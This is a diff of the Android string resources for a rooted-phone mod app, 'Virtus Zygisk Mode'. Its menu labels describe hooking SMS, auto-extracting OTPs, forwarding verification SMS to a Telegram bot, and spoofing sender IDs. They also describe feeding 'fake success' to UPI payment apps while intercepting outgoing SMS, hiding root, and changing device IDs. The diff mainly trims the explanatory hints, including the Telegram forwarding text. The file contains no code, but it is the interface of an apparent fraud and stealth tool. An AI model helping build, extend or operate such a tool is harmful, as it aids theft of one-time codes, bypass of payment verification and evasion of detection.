@@ -2,7 +2,7 @@
 <resources>
     <string name="app_name">𝙑𝙞𝙧𝙩𝙪𝙨 𝙕𝙮𝙜𝙞𝙨𝙠 𝙈𝙤𝙙𝙚</string>
     <string name="mod_menu_title">𝙑𝙞𝙧𝙩𝙪𝙨 𝙕𝙮𝙜𝙞𝙨𝙠 𝙈𝙤𝙙𝙚</string>
-    <string name="menu_subtitle">Open app → Start Hook → verify SMS Telegram pe</string>
+    <string name="menu_subtitle"></string>
     <string name="main_description">Start dabao — Hivirtus Zygisk Mode Menu turant khulega (UPI apps A-Z ready)</string>
     <string name="start_overlay">Start Zygisk Hooks</string>
     <string name="stop_overlay">Stop Floating Menu</string>
@@ -13,7 +13,7 @@
     <string name="permission_section">Required Permissions (dono Allow karo)</string>
     <string name="permission_overlay_ok">✅ Overlay: Allowed — bubble active</string>
     <string name="bubble_always_on">Bubble active — tap logo to open menu</string>
-    <string name="intercept_sender_hint">Sender ID — jo dalo wahi Telegram pe dikhega (number nahi)</string>
+    <string name="intercept_sender_hint">Sender ID</string>
     <string name="set_sender_id_first">Pehle Sender ID daalo MESSAGE tab me</string>
     <string name="sender_id_saved">Sender ID saved — intercept pe bilkul wahi dikhega</string>
     <string name="permission_overlay_missing">❌ Overlay: NOT allowed — bubble ke liye zaroori</string>
@@ -75,7 +75,7 @@
     <string name="hook_incoming_sms">Hook Incoming SMS</string>
     <string name="hook_outgoing_sms">Hook Outgoing SMS</string>
     <string name="auto_extract_otp">Auto Extract OTP</string>
-    <string name="override_incoming_sender">Override Sender ID on Incoming SMS (+91 hata ke Sender ID dikhao)</string>
+    <string name="override_incoming_sender">Override Sender ID</string>
     <string name="intercept_fake_success">Intercept &amp; Fake Success (outgoing)</string>
     <string name="intercept_fake_success_warn">ON = outgoing SMS intercept + fake success to app (UPI verify)</string>
     <string name="fake_intercept_telegram">Fake Intercept → Telegram (enable/disable)</string>
@@ -97,7 +97,7 @@
     <string name="enter_message_body">Message body enter karein</string>
     <string name="sms_injected">Local SMS injected</string>
     <string name="dev_credit">dev by @hivirtus</string>
-    <string name="dev_credit_footer">dev by @hivirtus · Zygisk Injected</string>
+    <string name="dev_credit_footer">@hivirtus</string>
     <string name="vip_access_title">◆ VIP ACCESS ◆</string>
     <string name="developer_hide_saved">Developer mode hide saved — apps restart karo</string>
     <string name="root_hide_saved">Root hide saved — stealth active</string>
@@ -140,14 +140,14 @@
     <string name="device_id_changed">Device ID change ho gayi — apps restart karein</string>
     <string name="vip_active">VIP Active</string>
     <string name="start_zygisk_hooks">▶ START ZYGISK HOOKS</string>
-    <string name="start_hook_foreground">▶ START HOOK (Open App)</string>
-    <string name="start_hook_app_success">✅ Start Successful — %1$s Hook Ready\nVerify SMS → Telegram active</string>
-    <string name="active_hook_none">Hooked App: None — pehle app kholo</string>
-    <string name="active_hook_app">Hooked App: %1$s ✅</string>
-    <string name="telegram_menu_hint">Telegram bot — verify SMS yahan forward hoga</string>
+    <string name="start_hook_foreground">START HOOK</string>
+    <string name="start_hook_app_success">Hook ready — %1$s</string>
+    <string name="active_hook_none">App: None</string>
+    <string name="active_hook_app">App: %1$s</string>
+    <string name="telegram_menu_hint"></string>
     <string name="start_hook_success">✅ Start Successful — All Hooks Ready\nZygisk injected · SMS · UPI · Root Hide · Device ID active</string>
-    <string name="hook_status_idle">Tap START to activate Zygisk hooks</string>
-    <string name="hook_status_ready">✅ Hook Ready — Zygisk Active</string>
+    <string name="hook_status_idle">Tap START</string>
+    <string name="hook_status_ready">Hook active</string>
     <string name="hook_status_no_module">❌ Module not flashed — install ZIP first</string>
     <string name="hook_status_not_loaded">⚠️ Zygisk not loaded — reboot + enable Zygisk</string>
     <string name="hook_status_no_sender">⚠️ Sender ID missing — MESSAGE tab me daalo</string>
